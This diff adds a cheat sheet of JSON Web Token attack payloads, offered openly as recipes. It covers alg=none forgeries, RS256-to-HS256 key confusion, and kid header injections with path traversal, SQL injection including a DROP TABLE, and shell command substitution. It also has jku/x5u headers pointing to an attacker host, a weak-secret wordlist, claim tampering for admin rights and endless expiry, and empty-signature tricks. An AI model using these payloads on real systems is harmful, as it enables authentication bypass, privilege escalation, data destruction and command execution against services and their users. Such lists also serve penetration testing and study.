@@ -1,0 +1,68 @@
+# JWT attack payloads / header tampering recipes
+# Decode with: echo "$JWT" | cut -d. -f1 | base64 -d | jq
+
+# --- alg=none ---
+Header:  {"alg":"none","typ":"JWT"}
+Payload: {"sub":"admin","role":"admin","exp":9999999999}
+Signature: (empty)
+
+# alg casing bypass (some libs normalize, some don't)
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE","typ":"JWT"}
+
+# --- RS256 -> HS256 key confusion ---
+# Take server's RSA public key (from /.well-known/jwks.json, TLS cert, or JKU)
+# Treat it as an HMAC secret and re-sign:
+Header: {"alg":"HS256","typ":"JWT"}
+# Then: HMAC-SHA256(public_key_pem_bytes, base64url(header)+"."+base64url(payload))
+
+# --- kid header injection ---
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}      # known-content file, secret = ""
+{"alg":"HS256","typ":"JWT","kid":"/dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"../../etc/hostname"}
+{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'AAAA' -- "}
+{"alg":"HS256","typ":"JWT","kid":"'; DROP TABLE keys; --"}
+{"alg":"HS256","typ":"JWT","kid":"$(whoami)"}
+
+# --- jku / x5u header injection ---
+{"alg":"RS256","jku":"https://attacker.tld/jwks.json","typ":"JWT"}
+{"alg":"RS256","jku":"https://target.tld@attacker.tld/jwks.json"}
+{"alg":"RS256","jku":"https://target.tld.attacker.tld/jwks.json"}
+{"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}
+{"alg":"RS256","x5c":["<attacker-controlled-cert-b64>"]}
+
+# --- Weak-secret wordlists (feed to jwt_tool -C -d) ---
+# Try first:
+secret
+Secret
+password
+changeme
+default
+jwt
+jwtsecret
+mysecret
+your-256-bit-secret
+123456
+admin
+
+# --- Claim tampering ---
+# Privilege escalation
+{"sub":"victim","role":"admin","iss":"trusted","aud":"api"}
+{"sub":"victim","scope":"admin read write delete","permissions":["*"]}
+# Expiration bypass
+{"exp":9999999999}
+{"exp":null}
+# Remove exp entirely
+# Issuer confusion
+{"iss":"https://attacker.tld"}
+
+# --- Embedded JWT in JWT (nested JWS) ---
+# Put an attacker-signed JWT as a claim value to confuse validators
+
+# --- psychic-signatures-style null byte/empty sig ---
+<header>.<payload>.
+<header>.<payload>.AAAA
+
+# --- Unverified JWKS rotation ---
+# If server caches JWKS by kid and trusts new kid, register new kid with your public key
